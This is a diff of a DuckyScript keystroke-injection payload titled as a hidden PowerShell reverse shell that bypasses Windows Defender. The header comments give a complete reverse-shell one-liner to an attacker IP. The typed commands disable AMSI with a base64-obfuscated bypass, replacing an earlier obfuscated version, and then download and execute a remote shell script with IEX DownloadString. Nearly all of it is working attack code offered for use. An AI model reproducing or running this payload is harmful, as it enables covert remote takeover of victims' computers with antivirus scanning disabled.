@@ -1,14 +1,11 @@
 REM Powershell - Hidden reverse shell - Bypass Windows Defender
 REM Author: 0iphor13
-REM Prepare this .ps1 script on your attacker machine
+REM Prepare this .ps1 script on your attacker machine or craft a fitting msf payload.
 REM
 REM \$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',PORTNUMBER);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
 REM
-REM Don't forget ro start http server & your listener
-REM
-REM Obfuscated on https://amsi.fail/ 
-
-
+REM Don't forget to start http server & your listener
+ 
 DELAY 1500
 GUI r
 DELAY 500
@@ -17,38 +14,21 @@ DELAY 250
 ENTER
 
 DELAY 500
-STRING [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetT
-DELAY 750
-STRING ype('System.Reflection.BindingFlags')).FullName), System.
-DELAY 750
-STRING Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Typ
-DELAY 750
-STRING e')), [Object]([Ref].Assembly.GetType("System.Management.
-DELAY 750
-STRING Automation.$([Char]([byTE]0x41)+[Char]([bytE]0x6D)+[Char](136
-DELAY 750
-STRING -21)+[CHAR]([bYTe]0x69)+[char](85)+[CHAr]([bYTe]0x74)+[CHaR]([BYTE]0x69)+[CH
-DELAY 750
-STRING AR]([BytE]0x6C)+[CHAr]([byTE]0x73))")),($([chAR]([bYte]0x47)+[CHAr]([B
-DELAY 750
-STRING yTe]0x65)+[chAR](120-4)+[CHar]([bytE]0x46)+[CHAR]([bYTE]0x69)+[CHAR]([BY
-DELAY 750
-STRING Te]0x65)+[cHAr]([ByTE]0x6C)+[chAr](6500/65)))).Invoke(''+$([ChAr]([bYtE]0x61
-DELAY 750
-STRING )+[chAr](149-40)+[cHaR]([bYTE]0x73)+[cHAr]([bYtE]0x69)+[CHAr]([byTe]0x49)+[c
-DELAY 750
-STRING HaR](4620/42)+[CHar](105)+[CHAR]([byTe]0x74)+[chAr]([ByTE]0x46)+[chaR]([BYTe]0
-DELAY 750
-STRING x61)+[cHar]([bYTe]0x69)+[ChaR]([bYTe]0x6C)+[chAR]([BYte]0x65)+[CHaR](100
-DELAY 750
-STRING ))+'',(("NonPublic,Static") -as [String].Assembly.GetType('System.Refle
-DELAY 750
-STRING ction.BindingFlags'))).SetValue($null,$True);
-DELAY 750
+STRING [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString
+DELAY 500
+STRING ([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($(
+DELAY 500
+STRING [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
+DELAY 500
+STRING ('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),
+DELAY 500
+STRING 'NonPublic,Static').SetValue($null,$true)
+DELAY 500
 ENTER
 
 
-DELAY 750 
-STRING IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER-IP:PORT/Invoke-Powershellshell.ps1')
-DELAY 1000
+DELAY 500
+STRING IEX (New-Object Net.WebClient).DownloadString('http://Attacker-IP:PORT/Invoke-PowerRevshell.ps1')
+DELAY 500
 ENTER
+
